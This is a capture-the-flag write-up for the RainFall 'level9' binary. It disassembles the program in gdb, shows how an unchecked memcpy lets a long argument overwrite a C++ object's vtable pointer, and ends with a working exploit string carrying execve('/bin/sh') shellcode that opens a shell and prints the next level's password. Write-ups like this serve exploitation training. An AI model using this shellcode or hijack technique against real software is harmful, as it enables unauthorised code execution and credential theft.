# level9

> Some preliminaries: if we need to install something or use something specific.

1. [Analysis](#analysis)
2. [Exploit](#exploit)

## Analysis

```gdb
gdb-peda$ disas
Dump of assembler code for function main:
   0x080485f4 <+0>:     push   ebp
   0x080485f5 <+1>:     mov    ebp,esp
   0x080485f7 <+3>:     push   ebx
   0x080485f8 <+4>:     and    esp,0xfffffff0
   0x080485fb <+7>:     sub    esp,0x20
   0x080485fe <+10>:    cmp    DWORD PTR [ebp+0x8],0x1              ; check if argc > 1
   0x08048602 <+14>:    jg     0x8048610 <main+28>                  ; if so jump to <main+28>
   0x08048604 <+16>:    mov    DWORD PTR [esp],0x1                  ; else load 1 into pointed value by esp
   0x0804860b <+23>:    call   0x80484f0 <_exit@plt>                ; call exit(1)
   0x08048610 <+28>:    mov    DWORD PTR [esp],0x6c                 ; put 0x6c (108) into address pointed by esp (previously it seems to contains a 0x2)
   0x08048617 <+35>:    call   0x8048530 <_Znwj@plt>                ; call <_Znwj@plt> (operator new)
   0x0804861c <+40>:    mov    ebx,eax                              ; save eax (return of <_Znwj@plt>) into ebx
   0x0804861e <+42>:    mov    DWORD PTR [esp+0x4],0x5              ; put 0x5 into the address pointed by esp+0x4
   0x08048626 <+50>:    mov    DWORD PTR [esp],ebx                  ; mov ebx on top of stack (esp)
   0x08048629 <+53>:    call   0x80486f6 <_ZN1NC2Ei>                ; call <_ZN1NC2Ei>
   0x0804862e <+58>:    mov    DWORD PTR [esp+0x1c],ebx             ; put ebx on the stack
   0x08048632 <+62>:    mov    DWORD PTR [esp],0x6c                 ; put 0x6c (108) into address pointed by esp
   0x08048639 <+69>:    call   0x8048530 <_Znwj@plt>                ; call <_Znwj@plt> (operator new)
   0x0804863e <+74>:    mov    ebx,eax                              ;
   0x08048640 <+76>:    mov    DWORD PTR [esp+0x4],0x6              ;
   0x08048648 <+84>:    mov    DWORD PTR [esp],ebx                  ;
   0x0804864b <+87>:    call   0x80486f6 <_ZN1NC2Ei>                ; ¿¿¿after this call the esp has changed!!!???
   0x08048650 <+92>:    mov    DWORD PTR [esp+0x18],ebx             ;
   0x08048654 <+96>:    mov    eax,DWORD PTR [esp+0x1c]             ;
   0x08048658 <+100>:   mov    DWORD PTR [esp+0x14],eax             ;
   0x0804865c <+104>:   mov    eax,DWORD PTR [esp+0x18]             ;
   0x08048660 <+108>:   mov    DWORD PTR [esp+0x10],eax             ;
   0x08048664 <+112>:   mov    eax,DWORD PTR [ebp+0xc]              ;
   0x08048667 <+115>:   add    eax,0x4                              ; at this stage eax contains argv[1]
   0x0804866a <+118>:   mov    eax,DWORD PTR [eax]                  ; 
   0x0804866c <+120>:   mov    DWORD PTR [esp+0x4],eax              ;
   0x08048670 <+124>:   mov    eax,DWORD PTR [esp+0x14]             ;
   0x08048674 <+128>:   mov    DWORD PTR [esp],eax                  ;
   0x08048677 <+131>:   call   0x804870e <_ZN1N13setAnnotationEPc>  ; 🖖
   0x0804867c <+136>:   mov    eax,DWORD PTR [esp+0x10]             ;
   0x08048680 <+140>:   mov    eax,DWORD PTR [eax]                  ;
   0x08048682 <+142>:   mov    edx,DWORD PTR [eax]                  ;
   0x08048684 <+144>:   mov    eax,DWORD PTR [esp+0x14]             ;
   0x08048688 <+148>:   mov    DWORD PTR [esp+0x4],eax              ;
   0x0804868c <+152>:   mov    eax,DWORD PTR [esp+0x10]             ;
   0x08048690 <+156>:   mov    DWORD PTR [esp],eax                  ;
   0x08048693 <+159>:   call   edx                                  ; ✋
   0x08048695 <+161>:   mov    ebx,DWORD PTR [ebp-0x4]              ;
   0x08048698 <+164>:   leave
   0x08048699 <+165>:   ret
End of assembler dump.
```

🖖

```gdb
   0x804866c <main+120>:    mov    DWORD PTR [esp+0x4],eax
   0x8048670 <main+124>:    mov    eax,DWORD PTR [esp+0x14]
   0x8048674 <main+128>:    mov    DWORD PTR [esp],eax
=> 0x8048677 <main+131>:    call   0x804870e <_ZN1N13setAnnotationEPc>
   0x804867c <main+136>:    mov    eax,DWORD PTR [esp+0x10]
   0x8048680 <main+140>:    mov    eax,DWORD PTR [eax]
   0x8048682 <main+142>:    mov    edx,DWORD PTR [eax]
   0x8048684 <main+144>:    mov    eax,DWORD PTR [esp+0x14]
Guessed arguments:
arg[0]: 0x804a008 --> 0x8048848 --> 0x804873a (<_ZN1NplERS_>:	push   ebp)
arg[1]: 0xbffff8eb ("AAAA")
arg[2]: 0xbffff7c0 --> 0xbffff8f0 ("TERM=xterm-256color")
arg[3]: 0xb7d79e55 (<__cxa_atexit+53>:	add    esp,0x18)
```

✋

`edx` is pointing to:

```gdb
EDX: 0x804873a (<_ZN1NplERS_>:	push   ebp)
```

```gdb
   0x8048688 <main+148>:    mov    DWORD PTR [esp+0x4],eax
   0x804868c <main+152>:    mov    eax,DWORD PTR [esp+0x10]
   0x8048690 <main+156>:    mov    DWORD PTR [esp],eax
=> 0x8048693 <main+159>:    call   edx
   0x8048695 <main+161>:    mov    ebx,DWORD PTR [ebp-0x4]
   0x8048698 <main+164>:    leave
   0x8048699 <main+165>:    ret
   0x804869a <_Z41__static_initialization_and_destruction_0ii>:	push   ebp
Guessed arguments:
arg[0]: 0x804a078 --> 0x8048848 --> 0x804873a (<_ZN1NplERS_>:	push   ebp)
arg[1]: 0x804a008 --> 0x8048848 --> 0x804873a (<_ZN1NplERS_>:	push   ebp)
```

After the `call   edx` it returns:

```gdb
EAX: 0xb ('\x0b')
```

---

```gdb
gdb-peda$ disas _ZN1N13setAnnotationEPc
Dump of assembler code for function _ZN1N13setAnnotationEPc:
   0x0804870e <+0>:     push   ebp
   0x0804870f <+1>:     mov    ebp,esp
   0x08048711 <+3>:     sub    esp,0x18
   0x08048714 <+6>:     mov    eax,DWORD PTR [ebp+0xc]
   0x08048717 <+9>:     mov    DWORD PTR [esp],eax          ; in eax and now in esp the first argument which is argv[1]
   0x0804871a <+12>:    call   0x8048520 <strlen@plt>       ; strlen(argv[1])
   0x0804871f <+17>:    mov    edx,DWORD PTR [ebp+0x8]
   0x08048722 <+20>:    add    edx,0x4
   0x08048725 <+23>:    mov    DWORD PTR [esp+0x8],eax
   0x08048729 <+27>:    mov    eax,DWORD PTR [ebp+0xc]
   0x0804872c <+30>:    mov    DWORD PTR [esp+0x4],eax
   0x08048730 <+34>:    mov    DWORD PTR [esp],edx
   0x08048733 <+37>:    call   0x8048510 <memcpy@plt>
   0x08048738 <+42>:    leave
   0x08048739 <+43>:    ret
End of assembler dump.
```

```gdb
gdb-peda$ disas _ZN1NplERS_
Dump of assembler code for function _ZN1NplERS_:
   0x0804873a <+0>:     push   ebp
   0x0804873b <+1>:     mov    ebp,esp
   0x0804873d <+3>:     mov    eax,DWORD PTR [ebp+0x8]
   0x08048740 <+6>:     mov    edx,DWORD PTR [eax+0x68]     ; edx = 0x6
   0x08048743 <+9>:     mov    eax,DWORD PTR [ebp+0xc]
   0x08048746 <+12>:    mov    eax,DWORD PTR [eax+0x68]     ; eax = 'ZZZZ' (the argv[1] == "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaa")
   0x08048749 <+15>:    add    eax,edx                      ; add last 4 bytes of something that seems to be two structures arguments
   0x0804874b <+17>:    pop    ebp
   0x0804874c <+18>:    ret
End of assembler dump.
```

`_ZN1NplERS_` seems to be in fact N::operator+(N&):

```gdb
0x0804873a in N::operator+(N&) ()
```

Just after this function we have:

```gdb
gdb-peda$ disas 0x804874e
Dump of assembler code for function _ZN1NmiERS_:
   0x0804874e <+0>:     push   ebp
   0x0804874f <+1>:     mov    ebp,esp
   0x08048751 <+3>:     mov    eax,DWORD PTR [ebp+0x8]
   0x08048754 <+6>:     mov    edx,DWORD PTR [eax+0x68]
   0x08048757 <+9>:     mov    eax,DWORD PTR [ebp+0xc]
   0x0804875a <+12>:    mov    eax,DWORD PTR [eax+0x68]
   0x0804875d <+15>:    mov    ecx,edx
   0x0804875f <+17>:    sub    ecx,eax
   0x08048761 <+19>:    mov    eax,ecx
   0x08048763 <+21>:    pop    ebp
   0x08048764 <+22>:    ret
End of assembler dump.
```

which seems to be the equivalent for `operator-`.

## Exploit

Here everything concerning the exploit description.

Segault when argument >= 109:

```console
level9@RainFall:~$ ./level9 `python -c 'print "\x10\xa0\x04\x08" + "\x90"*14 + "\xeb\x16\x31\xc0\x5b\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68" + "\x90"*54 + "\x0c\xa0\x04\x08"'`
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```
